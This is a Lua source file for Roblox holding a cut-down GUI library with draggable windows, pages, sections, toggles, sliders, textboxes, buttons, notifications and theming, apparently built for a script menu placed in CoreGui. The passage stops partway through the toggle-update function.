-- ===== LIBRARY (урезано под используемые функции: addPage/addSection/
-- addToggle/addSlider/addTextbox/addButton/Notify/setTheme) =====
local library = (function()
    local player  = game.Players.LocalPlayer
    local mouse   = player:GetMouse()
    local input   = game:GetService("UserInputService")
    local run     = game:GetService("RunService")
    local tween   = game:GetService("TweenService")
    local tweeninfo = TweenInfo.new

    local utility = {}
    local objects = {}
    local themes = {
        Background = Color3.fromRGB(24, 24, 24),
        Glow = Color3.fromRGB(0, 0, 0),
        Accent = Color3.fromRGB(10, 10, 10),
        LightContrast = Color3.fromRGB(20, 20, 20),
        DarkContrast = Color3.fromRGB(14, 14, 14),
        TextColor = Color3.fromRGB(255, 255, 255)
    }

    function utility:Create(instance, properties, children)
        local object = Instance.new(instance)
        for i, v in pairs(properties or {}) do
            object[i] = v
            if typeof(v) == "Color3" then
                local theme = utility:Find(themes, v)
                if theme then
                    objects[theme] = objects[theme] or {}
                    objects[theme][i] = objects[theme][i] or setmetatable({}, {_mode = "k"})
                    table.insert(objects[theme][i], object)
                end
            end
        end
        for i, module in pairs(children or {}) do
            module.Parent = object
        end
        return object
    end

    function utility:Tween(instance, properties, duration, ...)
        tween:Create(instance, tweeninfo(duration, ...), properties):Play()
    end

    function utility:Wait()
        run.RenderStepped:Wait()
        return true
    end

    function utility:Find(t, value)
        for i, v in pairs(t) do
            if v == value then return i end
        end
    end

    function utility:Pop(object, shrink)
        local clone = object:Clone()
        clone.AnchorPoint = Vector2.new(0.5, 0.5)
        clone.Size = clone.Size - UDim2.new(0, shrink, 0, shrink)
        clone.Position = UDim2.new(0.5, 0, 0.5, 0)
        clone.Parent = object
        clone:ClearAllChildren()
        object.ImageTransparency = 1
        utility:Tween(clone, {Size = object.Size}, 0.2)
        spawn(function()
            wait(0.2)
            object.ImageTransparency = 0
            clone:Destroy()
        end)
        return clone
    end

    function utility:InitializeKeybind()
        self.keybinds = {}
        self.ended = {}
        input.InputBegan:Connect(function(key)
            if self.keybinds[key.KeyCode] then
                for i, bind in pairs(self.keybinds[key.KeyCode]) do bind() end
            end
        end)
        input.InputEnded:Connect(function(key)
            if key.UserInputType == Enum.UserInputType.MouseButton1 then
                for i, callback in pairs(self.ended) do callback() end
            end
        end)
    end

    function utility:BindToKey(key, callback)
        self.keybinds[key] = self.keybinds[key] or {}
        table.insert(self.keybinds[key], callback)
        return {
            UnBind = function()
                for i, bind in pairs(self.keybinds[key]) do
                    if bind == callback then table.remove(self.keybinds[key], i) end
                end
            end
        }
    end

    function utility:DraggingEnabled(frame, parent)
        parent = parent or frame
        local dragging = false
        local dragInput, mousePos, framePos
        frame.InputBegan:Connect(function(inp)
            if inp.UserInputType == Enum.UserInputType.MouseButton1 then
                dragging = true
                mousePos = inp.Position
                framePos = parent.Position
                inp.Changed:Connect(function()
                    if inp.UserInputState == Enum.UserInputState.End then dragging = false end
                end)
            end
        end)
        frame.InputChanged:Connect(function(inp)
            if inp.UserInputType == Enum.UserInputType.MouseMovement then dragInput = inp end
        end)
        input.InputChanged:Connect(function(inp)
            if inp == dragInput and dragging then
                local delta = inp.Position - mousePos
                parent.Position = UDim2.new(framePos.X.Scale, framePos.X.Offset + delta.X, framePos.Y.Scale, framePos.Y.Offset + delta.Y)
            end
        end)
    end

    function utility:DraggingEnded(callback)
        table.insert(self.ended, callback)
    end

    function utility:CreateCloseButton(parent)
        local closeButton = utility:Create("ImageButton", {
            Name = "CloseButton", Parent = parent,
            BackgroundTransparency = 0.3, BackgroundColor3 = themes.DarkContrast,
            BorderSizePixel = 0, Size = UDim2.new(0, 22, 0, 22),
            Position = UDim2.new(1, -28, 0, 6), ZIndex = 10,
            Image = "rbxassetid://5012538583", ImageColor3 = themes.TextColor,
            ImageTransparency = 0.2
        }, { utility:Create("UICorner", {CornerRadius = UDim.new(0, 3)}) })

        closeButton.MouseEnter:Connect(function()
            utility:Tween(closeButton, {
                BackgroundColor3 = Color3.fromRGB(220, 60, 60), ImageColor3 = Color3.fromRGB(255, 255, 255),
                Size = UDim2.new(0, 24, 0, 24), Position = UDim2.new(1, -29, 0, 5)
            }, 0.15)
        end)
        closeButton.MouseLeave:Connect(function()
            utility:Tween(closeButton, {
                BackgroundColor3 = themes.DarkContrast, ImageColor3 = themes.TextColor,
                Size = UDim2.new(0, 22, 0, 22), Position = UDim2.new(1, -28, 0, 6)
            }, 0.15)
        end)
        return closeButton
    end

    function utility:CreateMinimizeButton(parent)
        local minimizeButton = utility:Create("TextButton", {
            Name = "MinimizeButton", Parent = parent,
            BackgroundTransparency = 0.3, BackgroundColor3 = themes.DarkContrast,
            BorderSizePixel = 0, Size = UDim2.new(0, 22, 0, 22),
            Position = UDim2.new(1, -52, 0, 6), ZIndex = 10,
            Text = "-", Font = Enum.Font.Gotham, TextColor3 = themes.TextColor,
            TextSize = 16, TextTransparency = 0.2
        }, { utility:Create("UICorner", {CornerRadius = UDim.new(0, 3)}) })

        minimizeButton.MouseEnter:Connect(function()
            utility:Tween(minimizeButton, {
                BackgroundColor3 = Color3.fromRGB(255, 220, 0), TextColor3 = Color3.fromRGB(255, 255, 255),
                Size = UDim2.new(0, 24, 0, 24), Position = UDim2.new(1, -53, 0, 5)
            }, 0.15)
        end)
        minimizeButton.MouseLeave:Connect(function()
            utility:Tween(minimizeButton, {
                BackgroundColor3 = themes.DarkContrast, TextColor3 = themes.TextColor,
                Size = UDim2.new(0, 22, 0, 22), Position = UDim2.new(1, -52, 0, 6)
            }, 0.15)
        end)
        return minimizeButton
    end

    function utility:DisableKeybind()
        self.keybinds = {}
        self.ended = {}
    end

    local library = {}
    local page = {}
    local section = {}
    library.__index = library
    page.__index = page
    section.__index = section

    function library.new(title, keybind)
        local container = utility:Create("ScreenGui", {
            Name = title, Parent = game.CoreGui
        }, {
            utility:Create("ImageLabel", {
                Name = "Main", BackgroundTransparency = 1,
                Position = UDim2.new(0.25, 0, 0.052435593, 0), Size = UDim2.new(0, 511, 0, 428),
                Image = "rbxassetid://4641149554", ImageColor3 = themes.Background,
                ScaleType = Enum.ScaleType.Slice, SliceCenter = Rect.new(4, 4, 296, 296)
            }, {
                utility:Create("ImageLabel", {
                    Name = "Glow", BackgroundTransparency = 1,
                    Position = UDim2.new(0, -15, 0, -15), Size = UDim2.new(1, 30, 1, 30),
                    ZIndex = 0, Image = "rbxassetid://5028857084", ImageColor3 = themes.Glow,
                    ScaleType = Enum.ScaleType.Slice, SliceCenter = Rect.new(24, 24, 276, 276)
                }),
                utility:Create("ImageLabel", {
                    Name = "Pages", BackgroundTransparency = 1, ClipsDescendants = true,
                    Position = UDim2.new(0, 0, 0, 38), Size = UDim2.new(0, 126, 1, -38),
                    ZIndex = 3, Image = "rbxassetid://5012534273", ImageColor3 = themes.DarkContrast,
                    ScaleType = Enum.ScaleType.Slice, SliceCenter = Rect.new(4, 4, 296, 296)
                }, {
                    utility:Create("ScrollingFrame", {
                        Name = "Pages_Container", Active = true, BackgroundTransparency = 1,
                        Position = UDim2.new(0, 0, 0, 10), Size = UDim2.new(1, 0, 1, -20),
                        CanvasSize = UDim2.new(0, 0, 0, 314), ScrollBarThickness = 0
                    }, {
                        utility:Create("UIListLayout", { SortOrder = Enum.SortOrder.LayoutOrder, Padding = UDim.new(0, 10) })
                    })
                }),
                utility:Create("ImageLabel", {
                    Name = "TopBar", BackgroundTransparency = 1, ClipsDescendants = true,
                    Size = UDim2.new(1, 0, 0, 38), ZIndex = 5,
                    Image = "rbxassetid://4595286933", ImageColor3 = themes.Accent,
                    ScaleType = Enum.ScaleType.Slice, SliceCenter = Rect.new(4, 4, 296, 296)
                }, {
                    utility:Create("TextLabel", {
                        Name = "Title", AnchorPoint = Vector2.new(0, 0.5), BackgroundTransparency = 1,
                        Position = UDim2.new(0, 12, 0, 19), Size = UDim2.new(1, -80, 0, 16),
                        ZIndex = 5, Font = Enum.Font.GothamBold, Text = title, TextColor3 = themes.TextColor,
                        TextSize = 14, TextXAlignment = Enum.TextXAlignment.Left
                    })
                })
            })
        })

        utility:InitializeKeybind()
        utility:DraggingEnabled(container.Main.TopBar, container.Main)

        local lib = setmetatable({
            container = container,
            pagesContainer = container.Main.Pages.Pages_Container,
            pages = {},
            keybind = keybind
        }, library)

        local closeButton = utility:CreateCloseButton(container.Main.TopBar)
        lib.closeButton = closeButton
        closeButton.MouseButton1Click:Connect(function()
            utility:Tween(closeButton, {Size = UDim2.new(0, 20, 0, 20), Position = UDim2.new(1, -27, 0, 7)}, 0.1)
            wait(0.1)
            if lib.Destroy then lib:Destroy() end
        end)

        local minimizeButton = utility:CreateMinimizeButton(container.Main.TopBar)
        local minimized = false
        local originalSize = container.Main.Size

        minimizeButton.MouseEnter:Connect(function()
            utility:Tween(minimizeButton, {BackgroundColor3 = Color3.fromRGB(255, 220, 0), Size = UDim2.new(0, 24, 0, 24), Position = UDim2.new(1, -53, 0, 5)}, 0.15)
        end)
        minimizeButton.MouseLeave:Connect(function()
            utility:Tween(minimizeButton, {BackgroundColor3 = Color3.fromRGB(255, 200, 0), Size = UDim2.new(0, 22, 0, 22), Position = UDim2.new(1, -52, 0, 6)}, 0.15)
        end)
        minimizeButton.MouseButton1Click:Connect(function()
            minimized = not minimized
            if minimized then
                utility:Tween(container.Main, {Size = UDim2.new(originalSize.X.Scale, originalSize.X.Offset, 0, 38)}, 0.3)
                for _, child in pairs(container.Main:GetChildren()) do
                    if child ~= container.Main.TopBar then
                        if child:IsA("Frame") or child:IsA("ImageLabel") then utility:Tween(child, {ImageTransparency = 1}, 0.2)
                        elseif child:IsA("TextLabel") or child:IsA("TextBox") then utility:Tween(child, {TextTransparency = 1}, 0.2) end
                    end
                end
            else
                utility:Tween(container.Main, {Size = originalSize}, 0.3)
                for _, child in pairs(container.Main:GetChildren()) do
                    if child ~= container.Main.TopBar then
                        if child:IsA("Frame") or child:IsA("ImageLabel") then utility:Tween(child, {ImageTransparency = 0}, 0.3)
                        elseif child:IsA("TextLabel") or child:IsA("TextBox") then utility:Tween(child, {TextTransparency = 0}, 0.3) end
                    end
                end
            end
        end)

        if keybind then
            utility:BindToKey(Enum.KeyCode[keybind] or keybind, function() lib:toggle() end)
        end
        return lib
    end

    function page.new(lib, title, icon)
        local button = utility:Create("TextButton", {
            Name = title, Parent = lib.pagesContainer, BackgroundTransparency = 1,
            BorderSizePixel = 0, Size = UDim2.new(1, 0, 0, 26), ZIndex = 3,
            AutoButtonColor = false, Font = Enum.Font.Gotham, Text = "", TextSize = 14
        }, {
            utility:Create("TextLabel", {
                Name = "Title", AnchorPoint = Vector2.new(0, 0.5), BackgroundTransparency = 1,
                Position = UDim2.new(0, 40, 0.5, 0), Size = UDim2.new(0, 76, 1, 0),
                ZIndex = 3, Font = Enum.Font.Gotham, Text = title, TextColor3 = themes.TextColor,
                TextSize = 12, TextTransparency = 0.65, TextXAlignment = Enum.TextXAlignment.Left
            }),
            icon and utility:Create("ImageLabel", {
                Name = "Icon", AnchorPoint = Vector2.new(0, 0.5), BackgroundTransparency = 1,
                Position = UDim2.new(0, 12, 0.5, 0), Size = UDim2.new(0, 16, 0, 16),
                ZIndex = 3, Image = "rbxassetid://" .. tostring(icon), ImageColor3 = themes.TextColor,
                ImageTransparency = 0.64, ScaleType = Enum.ScaleType.Fit
            }) or {}
        })

        local container = utility:Create("ScrollingFrame", {
            Name = title, Parent = lib.container.Main, Active = true,
            BackgroundTransparency = 1, BorderSizePixel = 0,
            Position = UDim2.new(0, 134, 0, 46), Size = UDim2.new(1, -142, 1, -56),
            CanvasSize = UDim2.new(0, 0, 0, 466), ScrollBarThickness = 3,
            ScrollBarImageColor3 = themes.DarkContrast, Visible = false
        }, {
            utility:Create("UIListLayout", { SortOrder = Enum.SortOrder.LayoutOrder, Padding = UDim.new(0, 10) })
        })

        return setmetatable({ library = lib, container = container, button = button, sections = {} }, page)
    end

    function section.new(pg, title)
        local container = utility:Create("ImageLabel", {
            Name = title, Parent = pg.container, BackgroundTransparency = 1,
            Size = UDim2.new(1, -10, 0, 28), ZIndex = 2, Image = "rbxassetid://5028857472",
            ImageColor3 = themes.LightContrast, ScaleType = Enum.ScaleType.Slice,
            SliceCenter = Rect.new(4, 4, 296, 296), ClipsDescendants = true
        }, {
            utility:Create("Frame", {
                Name = "Container", Active = true, BackgroundTransparency = 1, BorderSizePixel = 0,
                Position = UDim2.new(0, 8, 0, 8), Size = UDim2.new(1, -16, 1, -16)
            }, {
                utility:Create("TextLabel", {
                    Name = "Title", BackgroundTransparency = 1, Size = UDim2.new(1, 0, 0, 20),
                    ZIndex = 2, Font = Enum.Font.GothamSemibold, Text = title, TextColor3 = themes.TextColor,
                    TextSize = 12, TextXAlignment = Enum.TextXAlignment.Left, TextTransparency = 1
                }),
                utility:Create("UIListLayout", { SortOrder = Enum.SortOrder.LayoutOrder, Padding = UDim.new(0, 4) })
            })
        })
        return setmetatable({ page = pg, container = container.Container, modules = {} }, section)
    end

    function library:addPage(...)
        local pg = page.new(self, ...)
        table.insert(self.pages, pg)
        pg.button.MouseButton1Click:Connect(function() self:SelectPage(pg, true) end)
        return pg
    end

    function page:addSection(...)
        local sec = section.new(self, ...)
        table.insert(self.sections, sec)
        return sec
    end

    function library:setTheme(theme, color3)
        themes[theme] = color3
        for property, objs in pairs(objects[theme] or {}) do
            for i, object in pairs(objs) do
                if not object.Parent or (object.Name == "Button" and object.Parent.Name == "ColorPicker") then
                    objs[i] = nil
                else
                    object[property] = color3
                end
            end
        end
    end

    function library:toggle()
        if self.toggling then return end
        self.toggling = true
        local container = self.container.Main
        local topbar = container.TopBar
        local closeButton = self.closeButton

        if self.position then
            utility:Tween(container, {Size = UDim2.new(0, 511, 0, 428), Position = self.position}, 0.2)
            wait(0.2)
            utility:Tween(topbar, {Size = UDim2.new(1, 0, 0, 38)}, 0.2)
            if closeButton then
                closeButton.Visible = true
                utility:Tween(closeButton, {ImageTransparency = 0.2, BackgroundTransparency = 0.3}, 0.2)
            end
            wait(0.2)
            container.ClipsDescendants = false
            self.position = nil
        else
            self.position = container.Position
            container.ClipsDescendants = true
            if closeButton then utility:Tween(closeButton, {ImageTransparency = 1, BackgroundTransparency = 1}, 0.2) end
            utility:Tween(topbar, {Size = UDim2.new(1, 0, 1, 0)}, 0.2)
            wait(0.2)
            utility:Tween(container, {Size = UDim2.new(0, 511, 0, 0), Position = self.position + UDim2.new(0, 0, 0, 428)}, 0.2)
            wait(0.2)
            if closeButton then closeButton.Visible = false end
        end
        self.toggling = false
    end

    function library:Notify(title, text)
        title = title or "Notification"
        text = text or ""
        local notification = utility:Create("ImageLabel", {
            Name = "Notification", Parent = self.container, BackgroundTransparency = 1,
            Size = UDim2.new(0, 0, 0, 0), Image = "rbxassetid://5028857472", ImageColor3 = themes.Background,
            ScaleType = Enum.ScaleType.Slice, SliceCenter = Rect.new(4, 4, 296, 296), ZIndex = 3,
            ClipsDescendants = true, AnchorPoint = Vector2.new(1, 0)
        }, {
            utility:Create("TextLabel", {
                Name = "Title", BackgroundTransparency = 1, Position = UDim2.new(0, 10, 0, 8),
                Size = UDim2.new(1, -40, 0, 16), ZIndex = 4, Font = Enum.Font.GothamSemibold,
                TextColor3 = themes.TextColor, TextSize = 14, TextXAlignment = Enum.TextXAlignment.Left,
                Text = title, TextWrapped = true
            }),
            utility:Create("TextLabel", {
                Name = "Text", BackgroundTransparency = 1, Position = UDim2.new(0, 10, 0, 28),
                Size = UDim2.new(1, -40, 0, 16), ZIndex = 4, Font = Enum.Font.Gotham,
                TextColor3 = themes.TextColor, TextSize = 12, TextXAlignment = Enum.TextXAlignment.Left,
                Text = text, TextWrapped = true
            }),
            utility:Create("ImageButton", {
                Name = "Close", BackgroundTransparency = 1, Position = UDim2.new(1, -26, 0, 8),
                Size = UDim2.new(0, 16, 0, 16), Image = "rbxassetid://5012538583",
                ImageColor3 = themes.TextColor, ZIndex = 4
            })
        })

        local ts = game:GetService("TextService")
        local titleSize = ts:GetTextSize(notification.Title.Text, notification.Title.TextSize, notification.Title.Font, Vector2.new(500, math.huge))
        local textSize  = ts:GetTextSize(notification.Text.Text,  notification.Text.TextSize,  notification.Text.Font,  Vector2.new(500, math.huge))
        local width  = math.max(titleSize.X, textSize.X) + 40
        local height = titleSize.Y + textSize.Y + 28

        local yOffset = 10
        if library.activeNotifications == nil then library.activeNotifications = {} end
        for _, n in ipairs(library.activeNotifications) do yOffset = yOffset + n.AbsoluteSize.Y + 8 end
        notification.Position = UDim2.new(1, -10, 0, yOffset)
        notification.Size = UDim2.new(0, 0, 0, 0)

        table.insert(library.activeNotifications, notification)
        utility:Tween(notification, {Size = UDim2.new(0, width, 0, height)}, 0.2)

        local function close()
            if not notification.Parent then return end
            notification:Destroy()
            for i, n in ipairs(library.activeNotifications) do
                if n == notification then table.remove(library.activeNotifications, i) break end
            end
            local yOff = 10
            for _, n in ipairs(library.activeNotifications) do
                utility:Tween(n, {Position = UDim2.new(1, -10, 0, yOff)}, 0.2)
                yOff = yOff + n.AbsoluteSize.Y + 8
            end
        end

        notification.Close.MouseButton1Click:Connect(close)
        delay(4, function() if notification.Parent then close() end end)
    end

    function library:Destroy()
        if self.closeButton then self.closeButton:Destroy() self.closeButton = nil end
        if self.container then self.container:Destroy() self.container = nil end
        if self.pagesContainer then self.pagesContainer:ClearAllChildren() self.pagesContainer = nil end
        if self.pages then for k in pairs(self.pages) do self.pages[k] = nil end end
        if utility.DisableKeybind then utility:DisableKeybind() end
    end

    function section:addButton(title, callback)
        local button = utility:Create("ImageButton", {
            Name = "Button", Parent = self.container, BackgroundTransparency = 1, BorderSizePixel = 0,
            Size = UDim2.new(1, 0, 0, 30), ZIndex = 2, Image = "rbxassetid://5028857472",
            ImageColor3 = themes.DarkContrast, ScaleType = Enum.ScaleType.Slice, SliceCenter = Rect.new(2, 2, 298, 298)
        }, {
            utility:Create("TextLabel", {
                Name = "Title", BackgroundTransparency = 1, Size = UDim2.new(1, 0, 1, 0), ZIndex = 3,
                Font = Enum.Font.Gotham, Text = title, TextColor3 = themes.TextColor, TextSize = 12,
                TextTransparency = 0.1
            })
        })
        table.insert(self.modules, button)
        local text = button.Title
        local debounce
        button.MouseButton1Click:Connect(function()
            if debounce then return end
            utility:Pop(button, 10)
            debounce = true
            text.TextSize = 0
            utility:Tween(button.Title, {TextSize = 14}, 0.2)
            wait(0.2)
            utility:Tween(button.Title, {TextSize = 12}, 0.2)
            if callback then callback(function(...) self:updateButton(button, ...) end) end
            debounce = false
        end)
        return button
    end

    function section:addToggle(title, default, callback)
        local toggle = utility:Create("ImageButton", {
            Name = "Toggle", Parent = self.container, BackgroundTransparency = 1, BorderSizePixel = 0,
            Size = UDim2.new(1, 0, 0, 30), ZIndex = 2, Image = "rbxassetid://5028857472",
            ImageColor3 = themes.DarkContrast, ScaleType = Enum.ScaleType.Slice, SliceCenter = Rect.new(2, 2, 298, 298)
        },{
            utility:Create("TextLabel", {
                Name = "Title", AnchorPoint = Vector2.new(0, 0.5), BackgroundTransparency = 1,
                Position = UDim2.new(0, 10, 0.5, 1), Size = UDim2.new(0.5, 0, 1, 0), ZIndex = 3,
                Font = Enum.Font.Gotham, Text = title, TextColor3 = themes.TextColor, TextSize = 12,
                TextTransparency = 0.1, TextXAlignment = Enum.TextXAlignment.Left
            }),
            utility:Create("ImageLabel", {
                Name = "Button", BackgroundTransparency = 1, BorderSizePixel = 0,
                Position = UDim2.new(1, -50, 0.5, -8), Size = UDim2.new(0, 40, 0, 16), ZIndex = 2,
                Image = "rbxassetid://5028857472", ImageColor3 = themes.LightContrast,
                ScaleType = Enum.ScaleType.Slice, SliceCenter = Rect.new(2, 2, 298, 298)
            }, {
                utility:Create("ImageLabel", {
                    Name = "Frame", BackgroundTransparency = 1, Position = UDim2.new(0, 2, 0.5, -6),
                    Size = UDim2.new(1, -22, 1, -4), ZIndex = 2, Image = "rbxassetid://5028857472",
                    ImageColor3 = themes.TextColor, ScaleType = Enum.ScaleType.Slice, SliceCenter = Rect.new(2, 2, 298, 298)
                })
            })
        })
        table.insert(self.modules, toggle)
        local active = default or false
        self:updateToggle(toggle, nil, active and 1 or 0)
        toggle.MouseButton1Click:Connect(function()
            active = not active
            self:updateToggle(toggle, nil, active and 1 or 0)
            if callback then callback(active, function(...) self:updateToggle(toggle, ...) end) end
        end)
        return toggle
    end

    function section:addTextbox(title, default, callback)
        local textbox = utility:Create("ImageButton", {
            Name = "Textbox", Parent = self.container, BackgroundTransparency = 1, BorderSizePixel = 0,
            Size = UDim2.new(1, 0, 0, 30), ZIndex = 2, Image = "rbxassetid://5028857472",
            ImageColor3 = themes.DarkContrast, ScaleType = Enum.ScaleType.Slice, SliceCenter = Rect.new(2, 2, 298, 298)
        }, {
            utility:Create("TextLabel", {
                Name = "Title", AnchorPoint = Vector2.new(0, 0.5), BackgroundTransparency = 1,
                Position = UDim2.new(0, 10, 0.5, 1), Size = UDim2.new(0.5, 0, 1, 0), ZIndex = 3,
                Font = Enum.Font.Gotham, Text = title, TextColor3 = themes.TextColor, TextSize = 12,
                TextTransparency = 0.1, TextXAlignment = Enum.TextXAlignment.Left
            }),
            utility:Create("ImageLabel", {
                Name = "Button", BackgroundTransparency = 1, Position = UDim2.new(1, -110, 0.5, -8),
                Size = UDim2.new(0, 100, 0, 16), ZIndex = 2, Image = "rbxassetid://5028857472",
                ImageColor3 = themes.LightContrast, ScaleType = Enum.ScaleType.Slice, SliceCenter = Rect.new(2, 2, 298, 298)
            }, {
                utility:Create("TextBox", {
                    Name = "Textbox", BackgroundTransparency = 1, TextTruncate = Enum.TextTruncate.AtEnd,
                    Position = UDim2.new(0, 5, 0, 0), Size = UDim2.new(1, -10, 1, 0), ZIndex = 3,
                    Font = Enum.Font.GothamSemibold, Text = default or "", TextColor3 = themes.TextColor, TextSize = 11
                })
            })
        })
        table.insert(self.modules, textbox)
        local button = textbox.Button
        local inp = button.Textbox
        textbox.MouseButton1Click:Connect(function()
            if textbox.Button.Size ~= UDim2.new(0, 100, 0, 16) then return end
            utility:Tween(textbox.Button, {Size = UDim2.new(0, 200, 0, 16), Position = UDim2.new(1, -210, 0.5, -8)}, 0.2)
            wait()
            inp.TextXAlignment = Enum.TextXAlignment.Left
            inp:CaptureFocus()
        end)
        inp:GetPropertyChangedSignal("Text"):Connect(function()
            if button.ImageTransparency == 0 and (button.Size == UDim2.new(0, 200, 0, 16) or button.Size == UDim2.new(0, 100, 0, 16)) then
                utility:Pop(button, 10)
            end
            if callback then callback(inp.Text, nil, function(...) self:updateTextbox(textbox, ...) end) end
        end)
        inp.FocusLost:Connect(function()
            inp.TextXAlignment = Enum.TextXAlignment.Center
            utility:Tween(textbox.Button, {Size = UDim2.new(0, 100, 0, 16), Position = UDim2.new(1, -110, 0.5, -8)}, 0.2)
            if callback then callback(inp.Text, true, function(...) self:updateTextbox(textbox, ...) end) end
        end)
        return textbox
    end

    function section:addSlider(title, default, min, max, callback)
        local slider = utility:Create("ImageButton", {
            Name = "Slider", Parent = self.container, BackgroundTransparency = 1, BorderSizePixel = 0,
            Position = UDim2.new(0.292817682, 0, 0.299145311, 0), Size = UDim2.new(1, 0, 0, 50), ZIndex = 2,
            Image = "rbxassetid://5028857472", ImageColor3 = themes.DarkContrast,
            ScaleType = Enum.ScaleType.Slice, SliceCenter = Rect.new(2, 2, 298, 298)
        }, {
            utility:Create("TextLabel", {
                Name = "Title", BackgroundTransparency = 1, Position = UDim2.new(0, 10, 0, 6),
                Size = UDim2.new(0.5, 0, 0, 16), ZIndex = 3, Font = Enum.Font.Gotham, Text = title,
                TextColor3 = themes.TextColor, TextSize = 12, TextTransparency = 0.1, TextXAlignment = Enum.TextXAlignment.Left
            }),
            utility:Create("TextBox", {
                Name = "TextBox", BackgroundTransparency = 1, BorderSizePixel = 0,
                Position = UDim2.new(1, -30, 0, 6), Size = UDim2.new(0, 20, 0, 16), ZIndex = 3,
                Font = Enum.Font.GothamSemibold, Text = default or min, TextColor3 = themes.TextColor,
                TextSize = 12, TextTransparency = 0.1, TextXAlignment = Enum.TextXAlignment.Right
            }),
            utility:Create("TextLabel", {
                Name = "Slider", BackgroundTransparency = 1, Position = UDim2.new(0, 10, 0, 28),
                Size = UDim2.new(1, -20, 0, 16), ZIndex = 3, Text = ""
            }, {
                utility:Create("ImageLabel", {
                    Name = "Bar", AnchorPoint = Vector2.new(0, 0.5), BackgroundTransparency = 1,
                    Position = UDim2.new(0, 0, 0.5, 0), Size = UDim2.new(1, 0, 0, 4), ZIndex = 3,
                    Image = "rbxassetid://5028857472", ImageColor3 = themes.LightContrast,
                    ScaleType = Enum.ScaleType.Slice, SliceCenter = Rect.new(2, 2, 298, 298)
                }, {
                    utility:Create("ImageLabel", {
                        Name = "Fill", BackgroundTransparency = 1, Size = UDim2.new(0.8, 0, 1, 0), ZIndex = 3,
                        Image = "rbxassetid://5028857472", ImageColor3 = themes.TextColor,
                        ScaleType = Enum.ScaleType.Slice, SliceCenter = Rect.new(2, 2, 298, 298)
                    }, {
                        utility:Create("ImageLabel", {
                            Name = "Circle", AnchorPoint = Vector2.new(0.5, 0.5), BackgroundTransparency = 1,
                            ImageTransparency = 1, ImageColor3 = themes.TextColor,
                            Position = UDim2.new(1, 0, 0.5, 0), Size = UDim2.new(0, 10, 0, 10),
                            ZIndex = 3, Image = "rbxassetid://4608020054"
                        })
                    })
                })
            })
        })
        table.insert(self.modules, slider)

        local allowed = { [""] = true, ["-"] = true }
        local textbox = slider.TextBox
        local circle  = slider.Slider.Bar.Fill.Circle
        local value   = default or min
        local dragging

        local cb = function(v)
            if callback then callback(v, function(...) self:updateSlider(slider, ...) end) end
        end

        self:updateSlider(slider, nil, value, min, max)

        utility:DraggingEnded(function() dragging = false end)

        slider.MouseButton1Down:Connect(function()
            dragging = true
            while dragging do
                utility:Tween(circle, {ImageTransparency = 0}, 0.1)
                value = self:updateSlider(slider, nil, nil, min, max, value)
                cb(value)
                utility:Wait()
            end
            wait(0.5)
            utility:Tween(circle, {ImageTransparency = 1}, 0.2)
        end)

        textbox.FocusLost:Connect(function()
            if not tonumber(textbox.Text) then
                value = self:updateSlider(slider, nil, default or min, min, max)
                cb(value)
            end
        end)

        textbox:GetPropertyChangedSignal("Text"):Connect(function()
            local t = textbox.Text
            if not allowed[t] and not tonumber(t) then
                textbox.Text = t:sub(1, #t - 1)
            elseif not allowed[t] then
                value = self:updateSlider(slider, nil, tonumber(t) or value, min, max)
                cb(value)
            end
        end)

        return slider
    end

    function library:SelectPage(pg, toggle)
        if toggle and self.focusedPage == pg then return end
        local button = pg.button

        if toggle then
            button.Title.TextTransparency = 0
            button.Title.Font = Enum.Font.GothamSemibold
            if button:FindFirstChild("Icon") then button.Icon.ImageTransparency = 0 end

            local focusedPage = self.focusedPage
            self.focusedPage = pg
            if focusedPage then self:SelectPage(focusedPage) end

            local existingSections = focusedPage and #focusedPage.sections or 0
            local sectionsRequired = #pg.sections - existingSections

            pg:Resize()
            for i, section in pairs(pg.sections) do section.container.Parent.ImageTransparency = 0 end

            if sectionsRequired < 0 then
                for i = existingSections, #pg.sections + 1, -1 do
                    local sec = focusedPage.sections[i].container.Parent
                    utility:Tween(sec, {ImageTransparency = 1}, 0.1)
                end
            end

            wait(0.1)
            pg.container.Visible = true
            if focusedPage then focusedPage.container.Visible = false end

            if sectionsRequired > 0 then
                for i = existingSections + 1, #pg.sections do
                    local sec = pg.sections[i].container.Parent
                    sec.ImageTransparency = 1
                    utility:Tween(sec, {ImageTransparency = 0}, 0.05)
                end
            end

            wait(0.05)
            for i, sec in pairs(pg.sections) do
                utility:Tween(sec.container.Title, {TextTransparency = 0}, 0.1)
                sec:Resize(true)
                wait(0.05)
            end

            wait(0.05)
            pg:Resize(true)
        else
            button.Title.Font = Enum.Font.Gotham
            button.Title.TextTransparency = 0.65
            if button:FindFirstChild("Icon") then button.Icon.ImageTransparency = 0.65 end

            for i, sec in pairs(pg.sections) do
                utility:Tween(sec.container.Parent, {Size = UDim2.new(1, -10, 0, 28)}, 0.1)
                utility:Tween(sec.container.Title, {TextTransparency = 1}, 0.1)
            end

            wait(0.1)
            pg.lastPosition = pg.container.CanvasPosition.Y
            pg:Resize()
        end
    end

    function page:Resize(scroll)
        local padding = 10
        local size = 0
        for i, section in pairs(self.sections) do
            size = size + section.container.Parent.AbsoluteSize.Y + padding
        end
        self.container.CanvasSize = UDim2.new(0, 0, 0, size)
        self.container.ScrollBarImageTransparency = (size > self.container.AbsoluteSize.Y) and 0 or 1
        if scroll then
            utility:Tween(self.container, {CanvasPosition = Vector2.new(0, self.lastPosition or 0)}, 0.2)
        end
    end

    function section:Resize(smooth)
        if self.page.library.focusedPage ~= self.page then return end
        local padding = 4
        local size = (4 * padding) + self.container.Title.AbsoluteSize.Y
        for i, module in pairs(self.modules) do size = size + module.AbsoluteSize.Y + padding end
        if smooth then
            utility:Tween(self.container.Parent, {Size = UDim2.new(1, -10, 0, size)}, 0.05)
        else
            self.container.Parent.Size = UDim2.new(1, -10, 0, size)
            self.page:Resize()
        end
    end

    function section:getModule(info)
        if table.find(self.modules, info) then return info end
        for i, module in pairs(self.modules) do
            if (module:FindFirstChild("Title") or module:FindFirstChild("TextBox", true)).Text == info then
                return module
            end
        end
        error("No module found under "..tostring(info))
    end

    function section:updateButton(button, title)
        button = self:getModule(button)
        button.Title.Text = title
    end

    function section:updateToggle(toggle, title, value)
        toggle = self:getModule(toggle)
        local position = { In = UDim2.new(0, 2, 0.5, -6), Out = UDim2.new(0, 20, 0.5, -6) }
        local frame = toggle.Button.Frame
        local boolValue = (value == true or value == 1)
        local state = boolValue and "Out" or "In"
        if title then toggle.Title.Text = title end
